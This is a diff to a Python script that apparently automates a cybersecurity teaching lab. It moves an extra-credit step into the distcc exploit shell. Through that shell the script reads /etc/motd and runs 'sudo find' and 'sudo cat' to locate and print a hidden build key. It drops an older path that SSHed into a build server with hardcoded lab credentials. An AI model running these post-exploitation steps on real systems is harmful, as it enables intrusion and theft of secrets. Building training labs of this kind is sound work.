@@ -429,11 +429,6 @@ EOF'''
                 client.close()
                 return False
             
-            # Step 11: Extra Credit - Find MOTD and build key on ubuntu-target2 (Q16)
-            if not self._find_build_key(client):
-                # Extra credit failure doesn't fail the whole lab
-                print(f"[{self.student_id}] ⚠️ Extra credit not completed, continuing...")
-            
             client.close()
             print(f"[{self.student_id}] 🎉 Attack lab completed successfully!")
             return True
@@ -767,6 +762,39 @@ EOF'''
             
             self.log_result("Distcc Post-Exploit", True, time.time() - start_time)
             
+            # Extra Credit: Find MOTD and build key (Q16)
+            # Use the distcc shell which has passwordless sudo
+            print(f"[{self.student_id}] Extra Credit: Reading MOTD for clues...")
+            channel.send(b"cat /etc/motd\n")
+            time.sleep(1)
+            try:
+                motd_data = channel.recv(2048).decode('utf-8', errors='ignore')
+                print(f"[{self.student_id}] MOTD: {motd_data.strip()[:200]}")
+            except:
+                pass
+            
+            print(f"[{self.student_id}] Extra Credit: Searching for build key...")
+            channel.send(b"sudo find / -type f -iname '*build*key*' 2>/dev/null\n")
+            time.sleep(3)
+            try:
+                find_data = channel.recv(4096).decode('utf-8', errors='ignore')
+                if "key" in find_data.lower():
+                    # Try to extract the file path and read it
+                    for line in find_data.split('\n'):
+                        if 'key' in line.lower() and line.startswith('/'):
+                            key_file = line.strip()
+                            print(f"[{self.student_id}] Found key file: {key_file}")
+                            channel.send(f"sudo cat {key_file}\n".encode('utf-8'))
+                            time.sleep(1)
+                            key_data = channel.recv(2048).decode('utf-8', errors='ignore')
+                            print(f"[{self.student_id}] 🔑 Build key: {key_data.strip()[:100]}")
+                            self.log_result("Extra Credit: Build Key", True, time.time() - start_time)
+                            break
+                else:
+                    self.log_result("Extra Credit: Build Key", False, time.time() - start_time, "Key file not found")
+            except:
+                self.log_result("Extra Credit: Build Key", False, time.time() - start_time, "Failed to read key")
+            
             # Exit metasploit
             channel.send(b"\x03")
             time.sleep(1)
@@ -782,75 +810,6 @@ EOF'''
             duration = time.time() - start_time
             print(f"[{self.student_id}] ❌ Distcc exploit failed: {e}")
             self.log_result("Distcc Exploit", False, duration, str(e))
-            return False
-    
-    def _find_build_key(self, client: paramiko.SSHClient) -> bool:
-        """Extra Credit: Find MOTD and build key on ubuntu-target2 (Q16)"""
-        
-        def connect_with_jump(host, user, password, gateway_client):
-            target_client = paramiko.SSHClient()
-            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            sock = gateway_client.get_transport().open_channel(
-                'direct-tcpip', (host, 22), ('', 0)
-            )
-            target_client.connect(
-                hostname=host, port=22, username=user, password=password,
-                sock=sock, look_for_keys=False, allow_agent=False, timeout=30
-            )
-            return target_client
-        
-        try:
-            # Connect to build-server as labuser (default credentials)
-            print(f"[{self.student_id}] SSH to build-server for extra credit...")
-            start_time = time.time()
-            
-            target_client = connect_with_jump(
-                host='build-server',
-                user='labuser',
-                password='defendlab',
-                gateway_client=client
-            )
-            
-            # Read the MOTD to find clue (Q16)
-            print(f"[{self.student_id}] Reading MOTD for clues...")
-            stdout, stderr, exit_code = self.run_ssh_command(
-                target_client, "cat /etc/motd", timeout=10
-            )
-            print(f"[{self.student_id}] MOTD: {stdout.strip()}")
-            
-            # Find the build key file
-            print(f"[{self.student_id}] Searching for build key...")
-            stdout, stderr, exit_code = self.run_ssh_command(
-                target_client, "sudo find / -type f -iname '*build*key*' 2>/dev/null", timeout=30
-            )
-            
-            key_file = None
-            if stdout.strip():
-                lines = stdout.strip().split('\n')
-                for line in lines:
-                    if 'key' in line.lower():
-                        key_file = line.strip()
-                        break
-            
-            if key_file:
-                # Read the key file
-                stdout, stderr, exit_code = self.run_ssh_command(
-                    target_client, f"cat {key_file}", timeout=10
-                )
-                if stdout.strip():
-                    print(f"[{self.student_id}] 🔑 Build key: {stdout.strip()}")
-                    self.log_result("Extra Credit: Build Key", True, time.time() - start_time)
-                    target_client.close()
-                    return True
-            
-            duration = time.time() - start_time
-            self.log_result("Extra Credit: Build Key", False, duration, "Key file not found")
-            target_client.close()
-            return False
-            
-        except Exception as e:
-            print(f"[{self.student_id}] ⚠️ Extra credit failed: {e}")
-            self.log_result("Extra Credit: Build Key", False, 0, str(e))
             return False
             
     def lab_assignment_3(self) -> bool:
